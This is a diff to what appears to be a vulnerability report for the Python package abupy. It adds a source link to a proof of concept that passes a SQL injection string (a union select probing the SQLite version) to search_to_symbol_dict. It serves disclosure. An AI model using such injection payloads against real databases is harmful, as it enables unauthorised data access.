@@ -17,7 +17,7 @@ Firstly download abupy latest version(v0.4.0)
 pip install abupy
 ```
 
-Secondly import abupy.MarketBu.ABuSymbol, and call abupy.MarketBu.ABuSymbol.search_to_symbol_dict with test_payload as argument(abupy.MarketBu.ABuSymbol.search_to_symbol_dict is a functional api which author mentioned in the comments of the function, It is legal and normal for users to call this function)
+Secondly import abupy.MarketBu.ABuSymbol, and call abupy.MarketBu.ABuSymbol.search_to_symbol_dict with test_payload as argument(abupy.MarketBu.ABuSymbol.search_to_symbol_dict is a functional api which author mentioned in the comments of the function, It is legal and normal for users to call this function, proof: https://github.com/bbfamily/abu/blob/master/abupy/MarketBu/ABuSymbol.py -> line: 200)
 ```py
 import abupy.MarketBu.ABuSymbol
 print(abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='"))
